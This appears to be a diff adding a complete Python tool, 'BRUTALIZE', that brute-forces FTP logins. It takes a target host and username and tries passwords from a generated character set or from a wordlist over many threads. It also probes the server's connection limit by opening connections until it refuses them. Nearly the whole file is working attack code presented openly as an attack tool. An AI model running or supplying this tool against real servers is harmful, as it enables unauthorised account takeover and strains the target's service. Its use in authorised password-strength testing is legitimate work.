@@ -1,0 +1,250 @@
+#! /bin/python
+
+import socket
+import re
+import sys
+import time
+import argparse
+import itertools
+import ftplib
+import threading
+import os
+
+#global defaults
+class m_vars:
+    charset = ""
+    address = ""
+    user = ""
+    max_length = 8
+    min_length = 5
+    prefix_str = ""
+    postfix_str = ""
+    count = 0
+    pause = 0.01
+    thrds = 10
+    thrdcnt = 0
+    verb = False
+    pass_found = False
+    pwd = "n/a"
+    version = "V.0"
+    last_error_response = ""
+    test_max_threads = False
+
+#crack-it!
+def crack(password):
+    if connect(m_vars.address, m_vars.user, password):
+        m_vars.pass_found = True
+        m_vars.pwd = password
+        return True
+    
+    return False
+               
+#attempt connection to server
+def connect(ip, user, password):
+
+    try:
+        ftp = ftplib.FTP(ip)
+        ftp.login(user, password)
+        ftp.quit()
+    
+    except ftplib.all_errors as e:
+        if str(e).split(None, 1)[0] == "[Errno":
+            m_vars.last_error_response = str(e).split(None, 4)[1].split("]", 1)[0]
+        else:
+            m_vars.last_error_response = str(e).split(None, 1)[0]
+        return False
+
+    return True
+
+#wait for all threads to finnish
+def wait(threads):
+    for thread in threads: thread.join()
+
+#re-prints header
+def print_screen():
+
+    #clear screen
+    os.system("clear")
+
+    #print header
+    print("=================== BRUTALIZE == " + m_vars.version + " ====================")
+    print("\nAttacking FTP user [" + args.username + "] at [" + args.host + "]" + " Threads [" +
+            str(m_vars.thrds) + "]")
+    print("=========================================================")
+
+def get_server_response(ip):
+    try:
+        ftp = ftplib.FTP(ip)
+        ftp.quit()
+        return
+
+    except ftplib.all_errors as e:
+        if str(e).split(None, 1)[0] == "[Errno":
+            m_vars.last_error_response = str(e).split(None, 4)[1].split("]", 1)[0]
+        else:
+            m_vars.last_error_response = str(e).split(None, 1)[0]
+        return 
+
+#test server for allowed number or threads
+def threads_allowed(ip):
+    counter = 0
+    threads = []
+    thrdcnt = 0
+    
+    while(True):
+        print_screen()
+        print("Testing server for max threads..")
+        thread = threading.Thread(target=connect, args=[ip, "user", "pass"])
+        thread.start()
+        threads.append(thread)
+        thrdcnt += 1
+        time.sleep(m_vars.pause)
+
+        #print(str(thrdcnt) + " " +  m_vars.last_error_response)
+        if m_vars.last_error_response  == "421":
+            wait(threads)
+            return thrdcnt -1
+
+#main application
+def main(args):
+    
+    #print header
+    print_screen()
+
+    #global variables
+    if args.host:m_vars.address = args.host
+    if args.username:m_vars.user = args.username
+
+    if args.threads:m_vars.thrds = int(args.threads)
+    if args.pause:m_vars.pause = float(args.pause)
+    if args.verbose:m_vars.verb = True
+    if args.length:m_vars.max_length = int(args.length)
+    if args.minlength:m_vars.min_length = int(args.minlength)
+    if args.charset:m_vars.charset = args.charset
+    if args.prefix:m_vars.prefix_str = args.prefix
+    if args.postfix:m_vars.postfix_str = args.postfix
+    if args.maxthreads:m_vars.test_max_threads = True
+    if args.charset == None:
+        #create charset from printable ascii range
+        for char in range(37, 127):m_vars.charset += chr(char)
+
+    #local variables
+    threads = [];threadcnt = 0
+
+    #start timer
+    start = time.time()
+    
+    #if maxthreads specified, test for max threads
+    if m_vars.test_max_threads:
+        m_vars.thrds = threads_allowed(m_vars.address)
+        print("threads allowed: " + str(m_vars.thrds)) 
+
+    if args.wordlist == None:
+        #run brute-force attack
+        for i in range(m_vars.min_length, m_vars.max_length + 1):
+            if m_vars.pass_found: break
+                
+            #check if connection to server is alive
+            if m_vars.last_error_response == '111':    
+                print("Connection refused, server down?")
+                break
+            
+            for p in itertools.product(m_vars.charset, repeat=i):
+                if m_vars.pass_found: break
+
+                passw = ''.join(p)
+                m_vars.count += 1
+                
+                print_screen()
+                print("Attempt: " + str(m_vars.count) + " candidate: " + passw + " last response: " +
+                        m_vars.last_error_response)
+                
+                if m_vars.thrdcnt == m_vars.thrds:
+                    m_vars.thrdcnt = 0
+                    wait(threads)
+             
+                thread = threading.Thread(target=crack, args=[passw])
+                thread.start()
+                threads.append(thread)
+                m_vars.thrdcnt += 1
+                time.sleep(m_vars.pause)
+    else:
+        #run dictionary attack
+        with open(args.wordlist) as wlist:
+            for passw in wlist:
+                
+
+                #check if connection to server is alive
+                if m_vars.last_error_response == '111':    
+                    print("Connection refused, server down?")
+                    break
+                if m_vars.pass_found: break
+                
+                passw = passw.rstrip()
+
+                m_vars.count += 1
+                print_screen()
+                print("Attempt: " + str(m_vars.count) + " Candidate: " + passw + " last response: "
+                        + m_vars.last_error_response)
+
+                if m_vars.thrdcnt == m_vars.thrds:
+                    m_vars.thrdcnt = 0
+                    wait(threads)
+
+                thread = threading.Thread(target=crack, args=[passw])
+                thread.start()
+                threads.append(thread)
+                m_vars.thrdcnt += 1
+                time.sleep(m_vars.pause)
+    
+    #end timer
+    end = time.time() - start
+
+    print("waiting for threads to finnish..")
+    wait(threads)
+
+    #print result information
+    print(str(m_vars.count) + " Attempts in: " + str(round(end, 2)) + "s,  password: " + m_vars.pwd)
+    
+    #exit
+    print("Done")
+    return 0
+
+
+if __name__ == "__main__":
+    
+    #Parser Arguments
+    parser = argparse.ArgumentParser()
+    parser.add_argument("host", action="store", help="FTP Host to attack")
+    parser.add_argument("username", action="store", help="Username to attack")
+    parser.add_argument("-w", "--wordlist", action="store", help="Wordlist of passwords to use")
+    parser.add_argument("-c", "--charset", action="store", help="Characters to use for bruteforce attack")
+    parser.add_argument("-l", "--length", action="store", help="Length of the password to crack",nargs='?', default=8, const=8, type=int)
+    parser.add_argument("-m", "--minlength", action="store", help="Minimum length of password",nargs='?', default=1, const=1, type=int)
+    parser.add_argument("-r", "--prefix", action="store", help="Prefix: added before password")
+    parser.add_argument("-o", "--postfix", action="store", help="Postfix: added after the password")
+    parser.add_argument("-p", "--pause", action="store", help="Pause time between launching threads", nargs='?', default=0.01, const=0.01)
+    parser.add_argument("-t", "--threads", action="store", help="Number of threads to use", nargs='?', default=10, const=10, type=int)
+    parser.add_argument("-v", "--verbose", action="store", help="Verbose output", nargs='?', default=False, const=True)
+    parser.add_argument("-a", "--maxthreads", action="store", help="tests server for max threads",
+            nargs='?', default=False, const=True)
+    
+    #show help if required args are not provided
+    if len(sys.argv[2:])==0:
+        parser.print_help()
+        parser.exit()
+    args = parser.parse_args()
+    if args.minlength != None or args.length != None:
+        if args.minlength > args.length:
+            print("\n**Argument error**")
+            print("Minimum password length [-m "+str(args.minlength)+"] is greater than"+str(args.length))
+            parser.print_help()
+            parser.exit()
+    try:
+         main(args)
+    #catch ctrl-c and exit gracefully
+    except KeyboardInterrupt:
+        print("\n**Program interupted by user**")
+        print("waiting for threads to finnish..")
+        parser.exit()
+    
